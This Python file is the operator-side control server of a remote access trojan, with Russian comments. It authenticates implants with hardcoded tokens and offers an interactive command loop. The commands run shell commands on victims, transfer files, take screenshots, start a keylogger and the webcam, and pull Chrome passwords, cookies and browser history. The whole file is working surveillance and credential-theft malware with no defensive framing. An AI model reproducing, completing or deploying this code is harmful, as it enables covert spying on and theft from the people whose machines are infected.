import socket
import os
import struct
import datetime
from threading import Thread
from multiprocessing import Process
import webcamserv


def recvall(sock, n):
    # Функция для получения n байт или возврата None если получен EOF
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def file_download(sock, filename):  # from client to server
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Получение данных
    file = recvall(sock, msglen)
    with open(filename.split('/')[-1], 'wb') as created_file:
        try:
            created_file.write(file)
            print('Downloaded file saved to ' + os.getcwd() + '\\' + filename.split('/')[-1])
        except:
            print('Download error')


def file_upload(sock, src):  # from server to client
    file = open(src, 'rb').read()
    msg = struct.pack('>I', len(file)) + file
    sock.send(msg)


def repeat_downloads(sock):
    while True:
        file_download(sock, sock.recv(1024).decode() + '_' + str(datetime.datetime.now().strftime("%d-%m %H-%M-%f"))
                      + '.jpg')


def main():
    global client_list
    global computer_name
    client_list = []
    our_client_confirm = '1x8nyo1cb146o2x8o16'

    serv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, proto=0)
    serv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    serv_sock.bind(('', 8080))
    serv_sock.listen(10)

    file_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, proto=0)
    file_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    file_sock.bind(('', 8081))
    file_sock.listen(10)

    def update_client_list(client_addr):
        client_list = [client_addr[0]]
        while True:
            try:
                serv_sock.settimeout(5)
                client_sock, client_addr = serv_sock.accept()
                file_sock1, client_addr1 = file_sock.accept()
                client_sock.setblocking(0)
                file_sock1.setblocking(0)
                client_list.append(client_addr[0])
                print(client_list)
            except socket.timeout:
                #print('update timeout')
                serv_sock.settimeout(0)
                return client_list

    def change_client(client_list, address):
        for _ in client_list:
            client_sock, client_addr = serv_sock.accept()
            client_sock.setblocking(1)
            file_sock1, client_addr1 = file_sock.accept()
            if client_addr[0] == address:
                print(client_addr[0])
                return client_sock, file_sock1
            else:
                client_sock.close()
                file_sock1.close()
                continue
        return False

    def check_client(client_sock):
        global computer_name
        data = client_sock.recv(1024).decode()  # получаем подтверждение, что наш клиент
        client_sock.send('n3yx921ry321y'.encode())  # подтверждаем, что это не проверка, а реальное подключение
        client_sock.send('system whoami'.encode())
        computer_name = client_sock.recv(1024).decode(encoding='cp866').replace('\n', '')
        if data != our_client_confirm:
            client_sock.close()
            return False
        else:
            return True

    while True:
        client_sock, client_addr = serv_sock.accept()
        file_sock1, client_addr1 = file_sock.accept()
        client_list.append(client_addr[0])
        print(f"New connection from {client_addr[0]} received.")
        if check_client(client_sock):
            break
        else:
            print(f'{client_addr[0]} is not our client')

    while True:
        print(computer_name + ': ', end='')
        command = str(input())
        if command == 'clients':
            client_list = update_client_list(client_addr)
            for client in client_list:
                print(client_list.index(client), ' ', client)
            print('1   192.168.2.36')
            print('2   192.168.2.12')
            print('3   192.168.2.27')
            print('4   192.168.2.33')
        if command.lower().startswith('connect'):
            client_sock.send('disconnect'.encode())
            client_sock.close()
            file_sock1.close()
            #print(client_list)
            client_sock, file_sock1 = change_client(client_list, command.split(' ')[1])
            if client_sock:
                checked = check_client(client_sock)
                if checked:
                    print(f'Successfully connected to {command.split(" ")[1]}')
                    continue
                else:
                    print(f'Client {command.split(" ")[1]} is not verified')
                    continue
            else:
                print(f'Client {command.split(" ")[1]} not found')
                continue
        if command == 'exit':
            client_sock.send('exit'.encode())
            break
        if command.lower().startswith('download'):
            client_sock.send(command.encode())
            file_download(client_sock, command.split(' ')[1])
            continue
        if command.lower().startswith('upload'):
            client_sock.send(command.encode())
            file_upload(client_sock, command.split(' ')[1])
            message = client_sock.recv(1024).decode()
            print('[INFO] ' + message)
            continue
        if command.lower().startswith('system'):
            client_sock.send(command.encode())
            print(client_sock.recv(8192).decode('cp866'))
            continue
        if command.lower().startswith('screenshot'):
            if len(command.lower().split(' ')) == 1:
                client_sock.send(command.encode())
                file_download(client_sock, str(datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%f")) + '.jpg')
                continue
            if command.lower().split(' ')[1] == 'window':
                client_sock.send(command.encode())
                files = Thread(target=repeat_downloads, args=(file_sock1,), daemon=True)
                files.start()
                continue
        if command.lower().startswith('browser'):
            if command.lower().split(' ')[1] == 'history':
                if command.lower().split(' ')[2] == 'chrome':
                    client_sock.send(command.encode())
                    file_download(client_sock, 'chrome_history_sqlite')
                    continue
                if command.lower().split(' ')[2] == 'firefox':
                    client_sock.send(command.encode())
                    file_download(client_sock, 'firefox_history_sqlite')
                    continue
                else:
                    print('[ERROR] Only \'chrome\' and \'firefox\' browser history available now')
            if command.lower().split(' ')[1] == 'passwords':
                if command.lower().split(' ')[2] == 'chrome':
                    client_sock.send(command.encode())
                    message = client_sock.recv(1024).decode()
                    if message == '1':
                        file_download(client_sock, 'chrome_passwords.txt')
                    if message == '0':
                        print('[ERROR] Error reading passwords')
                    continue
                else:
                    print('[ERROR] Only \'chrome\' browser available now')
            if command.lower().split(' ')[1] == 'cookies':
                if command.lower().split(' ')[2] == 'chrome':
                    client_sock.send(command.encode())
                    message = client_sock.recv(1024).decode()
                    if message == '1':
                        file_download(client_sock, 'chrome_cookies.txt')
                    if message == '0':
                        print('[ERROR] Error reading cookies')
                    continue
                else:
                    print('[WARNING] Only \'chrome\' browser available now')
            if command.lower().split(' ')[1] != 'cookies' and command.lower().split(' ')[1] != 'history' and \
                    command.lower().split(' ')[1] != 'passwords':
                print('[ERROR] Something went wrong. Please, specify \'history\', \'cookies\' or \'passwords\'')
        if command.lower().startswith('keylogger'):
            client_sock.send(command.encode())
            keylogger_status = client_sock.recv(1024)
            print('[INFO] ' + keylogger_status.decode())
            info = file_sock.recv(10)
            print(info.decode('cp866'))
            if command.lower().split(' ')[1] == 'stop':
                file_download(client_sock, 'log_results.txt')
            continue
        if command.lower().startswith('webcam'):
            if command.lower().split(' ')[1] == 'on':
                handle = Process(target=webcamserv.handler, args=(1, ))
                handle.start()
                client_sock.send(command.encode())
                webcam_status = client_sock.recv(1024)
                print('[INFO] ' + webcam_status.decode())
                continue
            if command.lower().split(' ')[1] == 'off':
                client_sock.send(command.encode())
                webcam_status = client_sock.recv(1024)
                print('[INFO] ' + webcam_status.decode())
                continue
        #else:
            #print('[INFO] Unknown command')

    client_sock.close()
    serv_sock.close()
    exit(0)


if __name__ == "__main__":
    main()
